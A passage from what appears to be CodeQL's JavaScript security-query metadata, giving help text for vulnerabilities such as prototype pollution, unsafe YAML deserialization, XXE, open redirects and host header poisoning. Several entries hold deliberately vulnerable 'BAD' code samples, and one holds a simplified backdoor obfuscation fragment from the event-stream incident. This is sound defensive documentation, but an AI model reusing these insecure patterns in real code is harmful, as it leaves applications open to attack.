    \ {\n\t\tres.end(ajv.errorsText());\n\t\treturn;\n\t}\n\t// ...\n});\n\n```\n\n\
    ## References\n* Ajv documentation: [security considerations](https://github.com/ajv-validator/ajv/blob/master/docs/security.md#untrusted-schemas)\n\
    * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-400/RemotePropertyInjection.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-400/RemotePropertyInjection.bqrs
  metadata:
    name: Remote property injection
    description: |-
      Allowing writes to arbitrary properties of an object may lead to
                    denial-of-service attacks.
    kind: path-problem
    problem.severity: warning
    security-severity: 7.5
    precision: medium
    id: js/remote-property-injection
    tags: |-
      security
             external/cwe/cwe-250
             external/cwe/cwe-400
  queryHelp: "# Remote property injection\nDynamically computing object property names\
    \ from untrusted input may have multiple undesired consequences. For example,\
    \ if the property access is used as part of a write, an attacker may overwrite\
    \ vital properties of objects, such as `__proto__`. This attack is known as *prototype\
    \ pollution attack* and may serve as a vehicle for denial-of-service attacks.\
    \ A similar attack vector, is to replace the `toString` property of an object\
    \ with a primitive. Whenever `toString` is then called on that object, either\
    \ explicitly or implicitly as part of a type coercion, an exception will be raised.\n\
    \nMoreover, if the name of an HTTP header is user-controlled, an attacker may\
    \ exploit this to overwrite security-critical headers such as `Access-Control-Allow-Origin`\
    \ or `Content-Security-Policy`.\n\n\n## Recommendation\nThe most common case in\
    \ which prototype pollution vulnerabilities arise is when JavaScript objects are\
    \ used for implementing map data structures. This case should be avoided whenever\
    \ possible by using the ECMAScript 2015 `Map` instead. When this is not possible,\
    \ an alternative fix is to prepend untrusted input with a marker character such\
    \ as `$`, before using it in properties accesses. In this way, the attacker does\
    \ not have access to built-in properties which do not start with the chosen character.\n\
    \nWhen using user input as part of a header name, a sanitization step should be\
    \ performed on the input to ensure that the name does not clash with existing\
    \ header names such as `Content-Security-Policy`.\n\n\n## Example\nIn the example\
    \ below, the dynamically computed property `prop` is accessed on `myObj` using\
    \ a user-controlled value.\n\n\n```javascript\nvar express = require('express');\n\
    \nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res)\
    \ {\n\tvar prop = req.query.userControlled; // BAD\n\tmyObj[prop] = function()\
    \ {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\nThis is not secure\
    \ since an attacker may exploit this code to overwrite the property `__proto__`\
    \ with an empty function. If this happens, the concatenation in the `console.log`\
    \ argument will fail with a confusing message such as \"Function.prototype.toString\
    \ is not generic\". If the application does not properly handle this error, this\
    \ scenario may result in a serious denial-of-service attack. The fix is to prepend\
    \ the user-controlled string with a marker character such as `$` which will prevent\
    \ arbitrary property names from being overwritten.\n\n\n```javascript\nvar express\
    \ = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id',\
    \ function(req, res) {\n\tvar prop = \"$\" + req.query.userControlled; // GOOD\n\
    \tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n\
    });\n```\n\n## References\n* Prototype pollution attacks: [electron](https://github.com/electron/electron/pull/9287),\
    \ [lodash](https://hackerone.com/reports/310443), [hoek](https://npmjs.com/advisories/566).\n\
    * Penetration testing report: [ header name injection attack](http://seclists.org/pen-test/2009/Mar/67)\n\
    * npm blog post: [ dangers of square bracket notation](https://github.com/nodesecurity/eslint-plugin-security/blob/3c7522ca1be800353513282867a1034c795d9eb4/docs/the-dangers-of-square-bracket-notation.md)\n\
    * Common Weakness Enumeration: [CWE-250](https://cwe.mitre.org/data/definitions/250.html).\n\
    * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-502/UnsafeDeserialization.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-502/UnsafeDeserialization.bqrs
  metadata:
    name: Deserialization of user-controlled data
    description: |-
      Deserializing user-controlled data may allow attackers to
                    execute arbitrary code.
    kind: path-problem
    problem.severity: warning
    security-severity: 9.8
    precision: high
    id: js/unsafe-deserialization
    tags: |-
      security
             external/cwe/cwe-502
  queryHelp: |
    # Deserialization of user-controlled data
    Deserializing untrusted data using any deserialization framework that allows the construction of arbitrary functions is easily exploitable and, in many cases, allows an attacker to execute arbitrary code.


    ## Recommendation
    Avoid deserialization of untrusted data if at all possible. If the architecture permits it, then use formats like JSON or XML that cannot represent functions. When using YAML or other formats that support the serialization and deserialization of functions, ensure that the parser is configured to disable deserialization of arbitrary functions.


    ## Example
    The following example calls the `load` function of the popular `js-yaml` package on data that comes from an HTTP request and hence is inherently unsafe.


    ```javascript
    const app = require("express")(),
      jsyaml = require("js-yaml");

    app.get("load", function(req, res) {
      let data = jsyaml.load(req.params.data);
      // ...
    });

    ```
    Using the `safeLoad` function instead (which does not deserialize YAML-encoded functions) removes the vulnerability.


    ```javascript
    const app = require("express")(),
      jsyaml = require("js-yaml");

    app.get("load", function(req, res) {
      let data = jsyaml.safeLoad(req.params.data);
      // ...
    });

    ```

    ## References
    * OWASP vulnerability description: [Deserialization of untrusted data](https://www.owasp.org/index.php/Deserialization_of_untrusted_data).
    * OWASP guidance on deserializing objects: [Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html).
    * Neal Poole: [Code Execution via YAML in JS-YAML Node.js Module](https://nealpoole.com/blog/2013/06/code-execution-via-yaml-in-js-yaml-nodejs-module/).
    * Common Weakness Enumeration: [CWE-502](https://cwe.mitre.org/data/definitions/502.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-506/HardcodedDataInterpretedAsCode.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-506/HardcodedDataInterpretedAsCode.bqrs
  metadata:
    name: Hard-coded data interpreted as code
    description: |-
      Transforming hard-coded data (such as hexadecimal constants) into code
                    to be executed is a technique often associated with backdoors and should
                    be avoided.
    kind: path-problem
    problem.severity: error
    security-severity: 9.1
    precision: medium
    id: js/hardcoded-data-interpreted-as-code
    tags: |-
      security
             external/cwe/cwe-506
  queryHelp: |
    # Hard-coded data interpreted as code
    Interpreting hard-coded data, such as string literals containing hexadecimal numbers, as code or as an import path is typical of malicious backdoor code that has been implanted into an otherwise trusted code base and is trying to hide its true purpose from casual readers or automated scanning tools.


    ## Recommendation
    Examine the code in question carefully to ascertain its provenance and its true purpose. If the code is benign, it should always be possible to rewrite it without relying on dynamically interpreting data as code, improving both clarity and safety.


    ## Example
    As an example of malicious code using this obfuscation technique, consider the following simplified version of a snippet of backdoor code that was discovered in a dependency of the popular `event-stream` npm package:


    ```javascript
    var r = require;

    function e(r) {
      return Buffer.from(r, "hex").toString()
    }

    // BAD: hexadecimal constant decoded and interpreted as import path
    var n = r(e("2e2f746573742f64617461"));

    ```
    While this shows only the first few lines of code, it already looks very suspicious since it takes a hard-coded string literal, hex-decodes it and then uses it as an import path. The only reason to do so is to hide the name of the file being imported.


    ## References
    * OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).
    * The npm Blog: [Details about the event-stream incident](https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident).
    * Common Weakness Enumeration: [CWE-506](https://cwe.mitre.org/data/definitions/506.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-598/SensitiveGetQuery.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-598/SensitiveGetQuery.bqrs
  metadata:
    name: Sensitive data read from GET request
    description: |-
      Placing sensitive data in a GET request increases the risk of
                    the data being exposed to an attacker.
    kind: problem
    problem.severity: warning
    security-severity: 6.5
    precision: high
    id: js/sensitive-get-query
    tags: |-
      security
             external/cwe/cwe-598
  queryHelp: |
    # Sensitive data read from GET request
    Sensitive information such as user passwords should not be transmitted within the query string of the requested URL. Sensitive information within URLs may be logged in various locations, including the user's browser, the web server, and any forward or reverse proxy servers between the two endpoints. URLs may also be displayed on-screen, bookmarked or emailed around by users. They may be disclosed to third parties via the Referer header when any off-site links are followed. Placing sensitive information into the URL therefore increases the risk that it will be captured by an attacker.


    ## Recommendation
    Use HTTP POST to send sensitive information as part of the request body; for example, as form data.


    ## Example
    The following example shows two route handlers that both receive a username and a password. The first receives this sensitive information from the query parameters of a GET request, which is transmitted in the URL. The second receives this sensitive information from the request body of a POST request.


    ```javascript
    const express = require('express');
    const app = express();
    app.use(require('body-parser').urlencoded({ extended: false }))

    // bad: sensitive information is read from query parameters
    app.get('/login1', (req, res) => {
        const user = req.query.user;
        const password = req.query.password;
        if (checkUser(user, password)) {
            res.send('Welcome');
        } else {
            res.send('Access denied');
        }
    });

    // good: sensitive information is read from post body
    app.post('/login2', (req, res) => {
        const user = req.body.user;
        const password = req.body.password;
        if (checkUser(user, password)) {
            res.send('Welcome');
        } else {
            res.send('Access denied');
        }
    });

    ```

    ## References
    * CWE: [CWE-598: Use of GET Request Method with Sensitive Query Strings](https://cwe.mitre.org/data/definitions/598.html)
    * PortSwigger (Burp): [Password Submitted using GET Method](https://portswigger.net/kb/issues/00400300_password-submitted-using-get-method)
    * OWASP: [Information Exposure through Query Strings in URL](https://owasp.org/www-community/vulnerabilities/Information_exposure_through_query_strings_in_url)
    * Common Weakness Enumeration: [CWE-598](https://cwe.mitre.org/data/definitions/598.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-601/ClientSideUrlRedirect.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-601/ClientSideUrlRedirect.bqrs
  metadata:
    name: Client-side URL redirect
    description: |-
      Client-side URL redirection based on unvalidated user input
                    may cause redirection to malicious web sites.
    kind: path-problem
    problem.severity: error
    security-severity: 6.1
    precision: high
    id: js/client-side-unvalidated-url-redirection
    tags: |-
      security
             external/cwe/cwe-079
             external/cwe/cwe-116
             external/cwe/cwe-601
  queryHelp: |
    # Client-side URL redirect
    Redirecting to a URL that is constructed from parts of the DOM that may be controlled by an attacker can facilitate phishing attacks. In these attacks, unsuspecting users can be redirected to a malicious site that looks very similar to the real site they intend to visit, but which is controlled by the attacker.


    ## Recommendation
    To guard against untrusted URL redirection, it is advisable to avoid putting user input directly into a redirect URL. Instead, maintain a list of authorized redirects on the server; then choose from that list based on the user input provided.


    ## Example
    The following example uses a regular expression to extract a query parameter from the document URL, and then uses it to construct a new URL to redirect to without any further validation. This may allow an attacker to craft a link that redirects from a trusted website to some arbitrary website of their choosing, which facilitates phishing attacks:


    ```javascript
    window.location = /.*redirect=([^&]*).*/.exec(document.location.href)[1];

    ```

    ## References
    * OWASP: [ XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
    * Common Weakness Enumeration: [CWE-601](https://cwe.mitre.org/data/definitions/601.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-601/ServerSideUrlRedirect.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-601/ServerSideUrlRedirect.bqrs
  metadata:
    name: Server-side URL redirect
    description: |-
      Server-side URL redirection based on unvalidated user input
                    may cause redirection to malicious web sites.
    kind: path-problem
    problem.severity: warning
    security-severity: 6.1
    id: js/server-side-unvalidated-url-redirection
    tags: |-
      security
             external/cwe/cwe-601
    precision: high
  queryHelp: |
    # Server-side URL redirect
    Directly incorporating user input into a URL redirect request without validating the input can facilitate phishing attacks. In these attacks, unsuspecting users can be redirected to a malicious site that looks very similar to the real site they intend to visit, but which is controlled by the attacker.


    ## Recommendation
    To guard against untrusted URL redirection, it is advisable to avoid putting user input directly into a redirect URL. Instead, maintain a list of authorized redirects on the server; then choose from that list based on the user input provided.

    If this is not possible, then the user input should be validated in some other way, for example, by verifying that the target URL is on the same host as the current page.


    ## Example
    The following example shows an HTTP request parameter being used directly in a URL redirect without validating the input, which facilitates phishing attacks:


    ```javascript
    const app = require("express")();

    app.get("/redirect", function (req, res) {
      // BAD: a request parameter is incorporated without validation into a URL redirect
      res.redirect(req.query["target"]);
    });

    ```
    One way to remedy the problem is to validate the user input against a known fixed string before doing the redirection:


    ```javascript
    const app = require("express")();

    const VALID_REDIRECT = "http://cwe.mitre.org/data/definitions/601.html";

    app.get("/redirect", function (req, res) {
      // GOOD: the request parameter is validated against a known fixed string
      let target = req.query["target"];
      if (VALID_REDIRECT === target) {
        res.redirect(target);
      } else {
        res.redirect("/");
      }
    });

    ```
    Alternatively, we can check that the target URL does not redirect to a different host by parsing it relative to a base URL with a known host and verifying that the host stays the same:


    ```javascript
    const app = require("express")();

    function isLocalUrl(path) {
      try {
        return (
          // TODO: consider substituting your own domain for example.com
          new URL(path, "https://example.com").origin === "https://example.com"
        );
      } catch (e) {
        return false;
      }
    }

    app.get("/redirect", function (req, res) {
      // GOOD: check that we don't redirect to a different host
      let target = req.query["target"];
      if (isLocalUrl(target)) {
        res.redirect(target);
      } else {
        res.redirect("/");
      }
    });

    ```
    Note that as written, the above code will allow redirects to URLs on `example.com`, which is harmless but perhaps not intended. You can substitute your own domain (if known) for `example.com` to prevent this.


    ## References
    * OWASP: [ XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).
    * Common Weakness Enumeration: [CWE-601](https://cwe.mitre.org/data/definitions/601.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-611/Xxe.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-611/Xxe.bqrs
  metadata:
    name: XML external entity expansion
    description: |-
      Parsing user input as an XML document with external
                    entity expansion is vulnerable to XXE attacks.
    kind: path-problem
    problem.severity: error
    security-severity: 9.1
    precision: high
    id: js/xxe
    tags: |-
      security
             external/cwe/cwe-611
             external/cwe/cwe-827
  queryHelp: |
    # XML external entity expansion
    Parsing untrusted XML files with a weakly configured XML parser may lead to an XML External Entity (XXE) attack. This type of attack uses external entity references to access arbitrary files on a system, carry out denial-of-service (DoS) attacks, or server-side request forgery. Even when the result of parsing is not returned to the user, DoS attacks are still possible and out-of-band data retrieval techniques may allow attackers to steal sensitive data.


    ## Recommendation
    The easiest way to prevent XXE attacks is to disable external entity handling when parsing untrusted data. How this is done depends on the library being used. Note that some libraries, such as recent versions of `libxml`, disable entity expansion by default, so unless you have explicitly enabled entity expansion, no further action needs to be taken.


    ## Example
    The following example uses the `libxml` XML parser to parse a string `xmlSrc`. If that string is from an untrusted source, this code may be vulnerable to an XXE attack, since the parser is invoked with the `noent` option set to `true`:


    ```javascript
    const app = require("express")(),
      libxml = require("libxmljs");

    app.post("upload", (req, res) => {
      let xmlSrc = req.body,
        doc = libxml.parseXml(xmlSrc, { noent: true });
    });

    ```
    To guard against XXE attacks, the `noent` option should be omitted or set to `false`. This means that no entity expansion is undertaken at all, not even for standard internal entities such as `&amp;` or `&gt;`. If desired, these entities can be expanded in a separate step using utility functions provided by libraries such as [underscore](http://underscorejs.org/#unescape), [lodash](https://lodash.com/docs/4.17.15#unescape) or [he](https://github.com/mathiasbynens/he).


    ```javascript
    const app = require("express")(),
      libxml = require("libxmljs");

    app.post("upload", (req, res) => {
      let xmlSrc = req.body,
        doc = libxml.parseXml(xmlSrc);
    });

    ```

    ## References
    * OWASP: [XML External Entity (XXE) Processing](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing).
    * Timothy Morgen: [XML Schema, DTD, and Entity Attacks](https://research.nccgroup.com/2014/05/19/xml-schema-dtd-and-entity-attacks-a-compendium-of-known-techniques/).
    * Timur Yunusov, Alexey Osipov: [XML Out-Of-Band Data Retrieval](https://www.slideshare.net/qqlan/bh-ready-v4).
    * Common Weakness Enumeration: [CWE-611](https://cwe.mitre.org/data/definitions/611.html).
    * Common Weakness Enumeration: [CWE-827](https://cwe.mitre.org/data/definitions/827.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-614/ClearTextCookie.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-614/ClearTextCookie.bqrs
  metadata:
    name: Clear text transmission of sensitive cookie
    description: |-
      Sending sensitive information in a cookie without requring SSL encryption
                    can expose the cookie to an attacker.
    kind: problem
    problem.severity: warning
    security-severity: 5.0
    precision: high
    id: js/clear-text-cookie
    tags: |-
      security
             external/cwe/cwe-614
             external/cwe/cwe-311
             external/cwe/cwe-312
             external/cwe/cwe-319
  queryHelp: |
    # Clear text transmission of sensitive cookie
    Cookies that are transmitted in clear text can be intercepted by an attacker. If sensitive cookies are intercepted, the attacker can read the cookie and use it to perform actions on the user's behalf.


    ## Recommendation
    Always transmit sensitive cookies using SSL by setting the `secure` attribute on the cookie.


    ## Example
    The following example stores an authentication token in a cookie that can be transmitted in clear text.


    ```javascript
    const http = require('http');

    const server = http.createServer((req, res) => {
        res.setHeader("Set-Cookie", `authKey=${makeAuthkey()}`);
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end('<h2>Hello world</h2>');
    });
    ```
    To force the cookie to be transmitted using SSL, set the `secure` attribute on the cookie.


    ```javascript
    const http = require('http');

    const server = http.createServer((req, res) => {
        res.setHeader("Set-Cookie", `authKey=${makeAuthkey()}; secure; httpOnly`);
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end('<h2>Hello world</h2>');
    });
    ```

    ## References
    * ExpressJS: [Use cookies securely](https://expressjs.com/en/advanced/best-practice-security.html#use-cookies-securely).
    * OWASP: [Set cookie flags appropriately](https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html#set-cookie-flags-appropriately).
    * Mozilla: [Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie).
    * Common Weakness Enumeration: [CWE-614](https://cwe.mitre.org/data/definitions/614.html).
    * Common Weakness Enumeration: [CWE-311](https://cwe.mitre.org/data/definitions/311.html).
    * Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).
    * Common Weakness Enumeration: [CWE-319](https://cwe.mitre.org/data/definitions/319.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-640/HostHeaderPoisoningInEmailGeneration.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-640/HostHeaderPoisoningInEmailGeneration.bqrs
  metadata:
    name: Host header poisoning in email generation
    description: |-
      Using the HTTP Host header to construct a link in an email can facilitate phishing
                    attacks and leak password reset tokens.
    kind: path-problem
    problem.severity: error
    security-severity: 9.8
    precision: high
    id: js/host-header-forgery-in-email-generation
    tags: |-
      security
             external/cwe/cwe-640
  queryHelp: |
    # Host header poisoning in email generation
    Using the HTTP Host header to construct a link in an email can facilitate phishing attacks and leak password reset tokens. A malicious user can send an HTTP request to the targeted web site, but with a Host header that refers to his own web site. This means the emails will be sent out to potential victims, originating from a server they trust, but with links leading to a malicious web site.

    If the email contains a password reset link, and should the victim click the link, the secret reset token will be leaked to the attacker. Using the leaked token, the attacker can then construct the real reset link and use it to change the victim's password.


    ## Recommendation
    Obtain the server's host name from a configuration file and avoid relying on the Host header.


    ## Example
    The following example uses the `req.host` to generate a password reset link. This value is derived from the Host header, and can thus be set to anything by an attacker:


    ```javascript
    let nodemailer = require('nodemailer');
    let express = require('express');
    let backend = require('./backend');

    let app = express();

    let config = JSON.parse(fs.readFileSync('config.json', 'utf8'));

    app.post('/resetpass', (req, res) => {
      let email = req.query.email;
      let transport = nodemailer.createTransport(config.smtp);
      let token = backend.getUserSecretResetToken(email);
      transport.sendMail({
        from: 'webmaster@example.com',
        to: email,
        subject: 'Forgot password',
        text: `Click to reset password: https://${req.host}/resettoken/${token}`,
      });
    });

    ```
    To ensure the link refers to the correct web site, get the host name from a configuration file:


    ```javascript
    let nodemailer = require('nodemailer');
    let express = require('express');
    let backend = require('./backend');

    let app = express();

    let config = JSON.parse(fs.readFileSync('config.json', 'utf8'));

    app.post('/resetpass', (req, res) => {
      let email = req.query.email;
      let transport = nodemailer.createTransport(config.smtp);
      let token = backend.getUserSecretResetToken(email);
      transport.sendMail({
        from: 'webmaster@example.com',
        to: email,
        subject: 'Forgot password',
        text: `Click to reset password: https://${config.hostname}/resettoken/${token}`,
      });
    });

    ```

    ## References
    * Mitre: [CWE-640: Weak Password Recovery Mechanism for Forgotten Password](https://cwe.mitre.org/data/definitions/640.html).
    * Ian Muscat: [What is a Host Header Attack?](https://www.acunetix.com/blog/articles/automated-detection-of-host-header-attacks/).
    * Common Weakness Enumeration: [CWE-640](https://cwe.mitre.org/data/definitions/640.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-643/XpathInjection.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-643/XpathInjection.bqrs
  metadata:
    name: XPath injection
    description: |-
      Building an XPath expression from user-controlled sources is vulnerable to insertion of
                    malicious code by the user.
    kind: path-problem
    problem.severity: error
    security-severity: 9.8
    precision: high
    id: js/xpath-injection
    tags: |-
      security
             external/cwe/cwe-643
  queryHelp: |
    # XPath injection
    If an XPath expression is built using string concatenation, and the components of the concatenation include user input, it makes it very easy for a user to create a malicious XPath expression.


    ## Recommendation
    If user input must be included in an XPath expression, either sanitize the data or use variable references to safely embed it without altering the structure of the expression.


    ## Example
    In this example, the code accepts a user name specified by the user, and uses this unvalidated and unsanitized value in an XPath expression constructed using the `xpath` package. This is vulnerable to the user providing special characters or string sequences that change the meaning of the XPath expression to search for different values.


    ```javascript
    const express = require('express');
    const xpath = require('xpath');
    const app = express();

    app.get('/some/route', function(req, res) {
      let userName = req.param("userName");

      // BAD: Use user-provided data directly in an XPath expression
      let badXPathExpr = xpath.parse("//users/user[login/text()='" + userName + "']/home_dir/text()");
      badXPathExpr.select({
        node: root
      });
    });

    ```
    Instead, embed the user input using the variable replacement mechanism offered by `xpath`:


    ```javascript
    const express = require('express');
    const xpath = require('xpath');
    const app = express();

    app.get('/some/route', function(req, res) {
      let userName = req.param("userName");

      // GOOD: Embed user-provided data using variables
      let goodXPathExpr = xpath.parse("//users/user[login/text()=$userName]/home_dir/text()");
      goodXPathExpr.select({
        node: root,
        variables: { userName: userName }
      });
    });

    ```

    ## References
    * OWASP: [Testing for XPath Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection).
    * OWASP: [XPath Injection](https://www.owasp.org/index.php/XPATH_Injection).
    * npm: [xpath](https://www.npmjs.com/package/xpath).
    * Common Weakness Enumeration: [CWE-643](https://cwe.mitre.org/data/definitions/643.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-693/InsecureHelmet.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-693/InsecureHelmet.bqrs
  metadata:
    name: Insecure configuration of Helmet security middleware
    description: The Helmet middleware is used to set security-related HTTP headers
      in Express applications. This query finds instances where the middleware is
      configured with important security features disabled.
    kind: problem
    problem.severity: error
    security-severity: 7.0
    precision: high
    id: js/insecure-helmet-configuration
    tags: |-
      security
              external/cwe/cwe-693
              external/cwe/cwe-1021
  queryHelp: |
    # Insecure configuration of Helmet security middleware
    [Helmet](https://helmetjs.github.io/) is a collection of middleware functions for securing Express apps. It sets various HTTP headers to guard against common web vulnerabilities. This query detects Helmet misconfigurations that can lead to security vulnerabilities, specifically:

    * Disabling frame protection
    * Disabling Content Security Policy
    Content Security Policy (CSP) helps spot and prevent injection attacks such as Cross-Site Scripting (XSS). Removing frame protections exposes an application to attacks such as clickjacking, where an attacker can trick a user into clicking on a button or link on a targeted page when they intended to click on the page carrying out the attack.

    Users of the query can extend the set of required Helmet features by adding additional checks for them, using CodeQL [data extensions](https://codeql.github.com/docs/codeql-language-guides/customizing-library-models-for-javascript/) in a [CodeQL model pack](https://docs.github.com/en/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-and-working-with-codeql-packs#creating-a-codeql-model-pack). See `CUSTOMIZING.md` in the query source for more information.


    ## Recommendation
    To help mitigate these vulnerabilities, ensure that the following Helmet functions are not disabled, and are configured appropriately to your application:

    * `frameguard`
    * `contentSecurityPolicy`

    ## Example
    The following code snippet demonstrates Helmet configured in an insecure manner:


    ```javascript
    const helmet = require('helmet');

    app.use(helmet({
        frameguard: false,
        contentSecurityPolicy: false
    }));
    ```
    In this example, the defaults are used, which enables frame protection and a default Content Security Policy.


    ```javascript
    app.use(helmet());
    ```
    You can also enable a custom Content Security Policy by passing an object to the `contentSecurityPolicy` key. For example, taken from the [Helmet docs](https://helmetjs.github.io/#content-security-policy):


    ```javascript
    app.use(
        helmet({
            contentSecurityPolicy: {
                directives: {
                    "script-src": ["'self'", "example.com"],
                    "style-src": null,
                },
            },
        })
    );
    ```

    ## References
    * [helmet.js website](https://helmetjs.github.io/)
    * [Content Security Policy (CSP) | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
    * [Mozilla Web Security Guidelines](https://infosec.mozilla.org/guidelines/web_security)
    * [Protect against clickjacking | MDN](https://developer.mozilla.org/en-US/docs/Web/Security#protect_against_clickjacking)
    * Common Weakness Enumeration: [CWE-693](https://cwe.mitre.org/data/definitions/693.html).
    * Common Weakness Enumeration: [CWE-1021](https://cwe.mitre.org/data/definitions/1021.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-730/RegExpInjection.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-730/RegExpInjection.bqrs
  metadata:
    name: Regular expression injection
    description: |-
      User input should not be used in regular expressions without first being escaped,
                    otherwise a malicious user may be able to inject an expression that could require
                    exponential time on certain inputs.
    kind: path-problem
    problem.severity: error
    security-severity: 7.5
    precision: high
    id: js/regex-injection
    tags: |-
      security
             external/cwe/cwe-730
             external/cwe/cwe-400
  queryHelp: |
    # Regular expression injection
    Constructing a regular expression with unsanitized user input is dangerous as a malicious user may be able to modify the meaning of the expression. In particular, such a user may be able to provide a regular expression fragment that takes exponential time in the worst case, and use that to perform a Denial of Service attack.


    ## Recommendation
    Before embedding user input into a regular expression, use a sanitization function such as lodash's `_.escapeRegExp` to escape meta-characters that have special meaning.


    ## Example
    The following example shows a HTTP request parameter that is used to construct a regular expression without sanitizing it first:


    ```javascript
    var express = require('express');
    var app = express();

    app.get('/findKey', function(req, res) {
      var key = req.param("key"), input = req.param("input");

      // BAD: Unsanitized user input is used to construct a regular expression
      var re = new RegExp("\\b" + key + "=(.*)\n");
    });

    ```
    Instead, the request parameter should be sanitized first, for example using the function `_.escapeRegExp` from the lodash package. This ensures that the user cannot insert characters which have a special meaning in regular expressions.


    ```javascript
    var express = require('express');
    var _ = require('lodash');
    var app = express();

    app.get('/findKey', function(req, res) {
      var key = req.param("key"), input = req.param("input");

      // GOOD: User input is sanitized before constructing the regex
      var safeKey = _.escapeRegExp(key);
      var re = new RegExp("\\b" + safeKey + "=(.*)\n");
    });

    ```

    ## References
    * OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).
    * Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).
    * npm: [lodash](https://www.npmjs.com/package/lodash).
    * Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).
    * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-730/ServerCrash.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-730/ServerCrash.bqrs
  metadata:
    name: Server crash
    description: |-
      A server that can be forced to crash may be vulnerable to denial-of-service
                    attacks.
    kind: path-problem
    problem.severity: warning
    security-severity: 7.5
    precision: high
    id: js/server-crash
    tags: |-
      security
             external/cwe/cwe-248
             external/cwe/cwe-730
  queryHelp: |
    # Server crash
    Servers handle requests from clients until terminated deliberately by a server administrator. A client request that results in an uncaught server-side exception causes the current server response generation to fail, and should not have an effect on subsequent client requests.

    Under some circumstances, uncaught exceptions can however cause the entire server to terminate abruptly. Such a behavior is highly undesirable, especially if it gives malicious users the ability to turn off the server at will, which is an efficient denial-of-service attack.


    ## Recommendation
    Ensure that the processing of client requests can not cause uncaught exceptions to terminate the entire server abruptly.


    ## Example
    The following server code checks if a client-provided file path is valid before saving data to that path. It would be reasonable to expect that the server responds with an error in case the request contains an invalid file path. However, the server instead throws an exception, which is uncaught in the context of the asynchronous callback invocation (`fs.access(...)`). This causes the entire server to terminate abruptly.


    ```javascript
    const express = require("express"),
      fs = require("fs");

    function save(rootDir, path, content) {
      if (!isValidPath(rootDir, req.query.filePath)) {
        throw new Error(`Invalid filePath: ${req.query.filePath}`); // BAD crashes the server
      }
      // write content to disk
    }

    express().post("/save", (req, res) => {
      fs.access(rootDir, (err) => {
        if (err) {
          console.error(
            `Server setup is corrupted, ${rootDir} cannot be accessed!`
          );
          res.status(500);
          res.end();
          return;
        }
        save(rootDir, req.query.path, req.body);
        res.status(200);
        res.end();
      });
    });

    ```
    To remedy this, the server can catch the exception explicitly with a `try/catch` block, and generate an appropriate error response instead:


    ```javascript
    // ...
    express().post("/save", (req, res) => {
      fs.access(rootDir, (err) => {
        // ...
        try {
          save(rootDir, req.query.path, req.body); // GOOD exception is caught below
          res.status(200);
          res.end();
        } catch (e) {
          res.status(500);
          res.end();
        }
      });
    });

    ```
    To simplify exception handling, it may be advisable to switch to async/await syntax instead of using callbacks, which allows wrapping the entire request handler in a `try/catch` block:


    ```javascript
    // ...
    express().post("/save", async (req, res) => {
      try {
        await fs.promises.access(rootDir);
